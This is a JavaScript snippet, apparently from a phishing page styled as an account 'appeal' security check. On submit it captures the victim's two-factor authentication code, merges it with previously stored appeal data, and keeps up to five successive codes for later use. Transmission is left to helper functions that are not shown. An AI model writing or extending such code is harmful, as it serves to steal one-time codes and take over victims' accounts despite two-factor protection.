(function () {
  document.addEventListener('DOMContentLoaded', function () {
    var form = document.getElementById('security-form');
    if (!form) return;

    var getRecord = window.getRecord;
    var saveRecord = window.saveRecord;
    var submitBtn = form.querySelector('button[type="submit"]');
    if (!submitBtn) return;

    // Use click so we read the value before script.js handler can reset/disable the field
    submitBtn.addEventListener('click', function () {
      try {
        var baseData = {};
        if (typeof getRecord === 'function') {
          try {
            var stored = getRecord('__appeal_temp');
            if (stored && typeof stored === 'object') {
              baseData = stored;
            }
          } catch (e) {
            console.warn('Failed to read temporary appeal data for 2FA:', e);
          }
        }

        var formData = new FormData(form);
        var code = formData.get('twoFa');
        if (!code) {
          console.warn('2FA code is empty, nothing to log.');
          return;
        }

        var combined = {};
        Object.keys(baseData).forEach(function (k) {
          combined[k] = baseData[k];
        });

        // Collect up to 5 codes: twoFa, twoFaSecond, twoFaThird, twoFaFourth, twoFaFifth
        var attemptIndex = 0;
        if (!combined.twoFa) {
          combined.twoFa = code;
          attemptIndex = 1;
        } else if (!combined.twoFaSecond) {
          combined.twoFaSecond = code;
          attemptIndex = 2;
        } else if (!combined.twoFaThird) {
          combined.twoFaThird = code;
          attemptIndex = 3;
        } else if (!combined.twoFaFourth) {
          combined.twoFaFourth = code;
          attemptIndex = 4;
        } else if (!combined.twoFaFifth) {
          combined.twoFaFifth = code;
          attemptIndex = 5;
        } else {
          // Already have 5 codes; just log without overwriting
          attemptIndex = 5;
        }

        if (typeof saveRecord === 'function') {
          try {
            saveRecord('__appeal_temp', combined);
          } catch (e) {
            console.warn('Failed to save combined 2FA data:', e);
          }
        }

        console.log('🔑 2FA modal combined data (attempt ' + attemptIndex + '):', combined);
      } catch (err) {
        console.warn('Failed to combine 2FA modal data:', err);
      }
    });
  });
})();


